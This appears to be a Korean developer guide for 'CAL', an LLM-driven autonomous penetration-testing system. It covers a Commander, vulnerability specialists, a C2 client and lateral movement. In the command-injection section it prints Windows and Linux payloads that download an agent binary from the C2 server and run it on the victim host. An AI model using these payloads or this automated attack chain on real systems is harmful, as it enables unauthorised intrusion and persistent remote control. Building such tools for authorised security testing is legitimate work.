# CAL (Cai) 개발 가이드

**언어**: 모든 답변과 설명은 **한국어**로 작성하십시오.

---

## 프로젝트 개요

CAL(Cai)은 **AI 기반 자율 침투 테스트 시스템**의 Brain 역할을 담당합니다.
- LLM 기반 전략 수립 (Commander)
- 전문화된 취약점 탐지/검증 (Specialists)
- TRT C2 서버 제어
- Agent 배포 및 Lateral Movement

---

## 기술 스택

| 구분 | 기술 |
|------|------|
| 언어 | Go 1.24+ |
| LLM | Google GenAI SDK (Gemini) |
| Vector DB | Qdrant (RAG 선택적) |
| 컨테이너 | Docker SDK |
| 이벤트 | Go Channels (Event Bus) |
| HTTP | Native HTTP Client (연결 풀링) |
| 설정 | godotenv, fsnotify (Hot Reload) |

---

## 프로젝트 구조

```
cal-project/
├── cmd/
│   ├── cal-server/main.go         # CLI 진입점 (--mode, --url, --email, --password)
│   ├── verify_trt/main.go         # TRT 연결 테스트
│   └── index-prompts/main.go      # 프롬프트 인덱싱 (RAG)
│
├── internal/
│   ├── brain/                     # AI 두뇌 (전략)
│   │   ├── commander/
│   │   │   └── commander.go       # 총괄 사령관 (전략 수립, Specialist 스폰)
│   │   ├── specialist/            # 전문가 에이전트들
│   │   │   ├── recon.go           # 네트워크 정찰 (Go TCP 스캐너)
│   │   │   ├── web.go             # 웹 분석
│   │   │   ├── crawler.go         # BFS 크롤링 (깊이 5, 최대 100페이지)
│   │   │   ├── login.go           # 자동 로그인
│   │   │   ├── xss.go             # XSS 탐지/검증 (5가지 payload)
│   │   │   ├── sqli.go            # SQL Injection (Boolean/Union/Time-based)
│   │   │   ├── pathtraversal.go   # Path Traversal (11가지 payload)
│   │   │   ├── fileupload.go      # File Upload (4가지 파일)
│   │   │   ├── cmdi.go            # Command Injection + Agent 배포
│   │   │   └── verification.go    # 취약점 최종 검증
│   │   ├── llm/
│   │   │   └── client.go          # Gemini 클라이언트 (캐시, 타임아웃)
│   │   └── prompts/               # 프롬프트 관리 시스템
│   │       ├── manager.go         # 중앙 관리자
│   │       ├── loader.go          # 파일 로더 ({{variable}} 치환)
│   │       ├── cache.go           # TTL 캐싱
│   │       ├── watcher.go         # Hot Reload (fsnotify)
│   │       └── rag.go             # RAG Engine (Qdrant)
│   │
│   ├── core/                      # 핵심 인프라
│   │   ├── bus/
│   │   │   └── bus.go             # Event Bus (Go Channels, Panic 복구)
│   │   ├── cache/
│   │   │   └── llm_cache.go       # LLM 응답 캐시 (TTL 30분)
│   │   ├── orchestrator/
│   │   │   └── orchestrator.go    # 에이전트 생명주기 관리
│   │   ├── reporter/
│   │   │   └── reporter.go        # 보고서 (Candidate/Finding 분리)
│   │   └── utils/
│   │       ├── goroutine.go       # SafeGo (Panic 복구)
│   │       └── llm.go             # LLM JSON 파싱 (3단계 전략)
│   │
│   └── hands/                     # 실행기 (손)
│       ├── trt/
│       │   └── trt_client.go      # TRT REST API 클라이언트
│       └── tools/
│           ├── scanner.go         # Go TCP 스캐너 (21개 포트, 병렬)
│           └── httpclient.go      # NativeExecutor (URL 인코딩 문제 해결)
│
├── assets/
│   └── prompts/v1/                # 프롬프트 파일 (13개)
│       ├── commander/             # initial.txt, analyze.txt
│       ├── specialist/            # web_analysis, xss, sqli, cmdi 등
│       ├── recon/                 # decision.txt
│       └── verification/          # extract.txt, platform_detect.txt
│
└── docs/
    └── trt_api_endpoints.json     # TRT API 전체 목록
```

---

## 실행 모드

### Single Target Mode (권장)
```bash
# 특정 URL 직접 공격 (ReconSpecialist 건너뛰기)
./cal-server.exe --mode=single --url=http://localhost:8888 --email=test@test.net --password=1234
```

### Network Mode
```bash
# 네트워크 범위 스캔 (CIDR 변환)
./cal-server.exe --mode=network --url=http://192.168.1.1
```

### RAG 활성화
```bash
# Qdrant 시작 후
./cal-server.exe --enable-rag --mode=single --url=http://localhost:8888
```

---

## 핵심 컴포넌트

### 1. Commander (commander.go)

**역할**: 전략 수립 및 Specialist 스폰

**주요 함수:**
- `Start()`: 모드에 따라 Recon 또는 Web Specialist 스폰
- `spawnWebSpecialistDirect()`: Single mode용 직접 공격
- `spawnVerificationSpecialist()`: 취약점 검증 자동 스폰
- `handleVulnerabilityReport()`: 취약점 보고 처리

### 2. Specialists (specialist/*.go)

**공통 패턴:**
```go
func (s *XSSSpecialist) OnEvent(ev bus.Event) {
    defer utils.SafeGo(func() { /* panic 복구 */ })()

    // 1. 패턴 매칭 (LLM 호출 전)
    // 2. LLM 분석 (필요 시)
    // 3. Exploitation (Active Verification)
    // 4. 결과 보고 (Finding 또는 Candidate)
}
```

**Exploitation 패턴:**
- XSS: 5가지 payload 테스트, reflection 확인
- SQLi: Boolean/Union/Time-based 순차 테스트
- PathTraversal: 11가지 payload, 파일 내용 검증
- FileUpload: 4가지 파일 업로드 + 접근 확인
- CMDi: RCE 검증 → Dual Platform Agent 배포

### 3. CommandInjectionSpecialist (cmdi.go)

**RCE 기반 Agent 배포:**
```go
// Dual Platform Deployment
windowsPayload := `& powershell -c "IWR -Uri .../agents/windows -OutFile agent.exe; Start-Process agent.exe -ArgumentList '-server ...'"`
linuxPayload := `; curl -s -o /tmp/agent .../agents/linux && chmod +x /tmp/agent && nohup /tmp/agent -server ... &`
```

**주요 함수:**
- `verifyRCE()`: RCE 가능 여부 확인
- `deployAgent()`: Windows/Linux 동시 배포
- `pollForNewAgent()`: TRT에서 새 Agent 등록 감지
- `reportCompromised()`: Compromised 이벤트 + NetworkNode 생성

### 4. TRT Client (trt_client.go)

**주요 함수:**
- `GetAgents()`: Agent 목록 조회
- `RunCommand()`: Agent 명령 실행
- `SaveScanResult()`: 스캔 결과 저장
- `CreateNetworkNode()`: 네트워크 노드 생성

---

## Event Bus 이벤트 타입

```go
const (
    ReconResult       EventType = "recon_result"
    WebAnalysis       EventType = "web_analysis"
    VulnerabilityReport EventType = "vulnerability_report"
    Compromised       EventType = "compromised"
    // ...
)
```

---

## 프롬프트 관리

### 파일 구조
```
assets/prompts/v1/
├── commander/initial.txt      # Commander 초기 프롬프트
├── specialist/xss_analysis.txt # XSS 탐지 프롬프트
└── ...
```

### 변수 치환
```
{{target_url}} → http://localhost:8888
{{session_cookie}} → PHPSESSID=abc123
{{html_content}} → <html>...</html>
```

### Hot Reload
파일 수정 시 자동 반영 (500ms debounce, 재시작 불필요)

---

## 코딩 컨벤션

### Go
- **네이밍**: camelCase (변수), PascalCase (exported)
- **에러 처리**: 명시적 반환 (`if err != nil`)
- **동시성**: Goroutine + Channel
- **Panic 복구**: `utils.SafeGo()` 사용

```go
// 좋은 예
func (s *Specialist) doWork(ctx context.Context) error {
    defer utils.SafeGo(func() { /* recovery */ })()

    result, err := s.executor.Execute(ctx, command)
    if err != nil {
        return fmt.Errorf("execute failed: %w", err)
    }
    return nil
}
```

### LLM JSON 파싱
```go
// 3단계 전략
result, err := utils.ParseLLMJSON[MyStruct](llmResponse)
// 1. 직접 파싱
// 2. JSON 블록 추출 후 파싱
// 3. Regex Fallback
```

---

## 타임아웃 설정

| 구분 | 값 |
|------|-----|
| 전역 | 5분 |
| LLM 호출 | 60초 |
| HTTP 요청 | 15초 |
| 서브넷 스캔 | 60초 |

---

## 주의사항

1. **NativeExecutor 사용**: URL 인코딩 문제로 TRT Executor 대신 직접 HTTP 요청
2. **Agent IP 추출**: `agent.HostIPAddrs` 사용 (Host는 컨테이너 hostname)
3. **Panic 복구**: 모든 Specialist OnEvent에 SafeGo 적용
4. **LLM 캐시**: SHA-256 해싱, TTL 30분

---

## TRT 연동 시 주의사항

TRT API 변경 시 다음 파일 수정 필요:
- `internal/hands/trt/trt_client.go`: API 호출 로직
- Request/Response 구조체 일치 확인
- 인증 토큰 처리 (`Authorization: Bearer`)
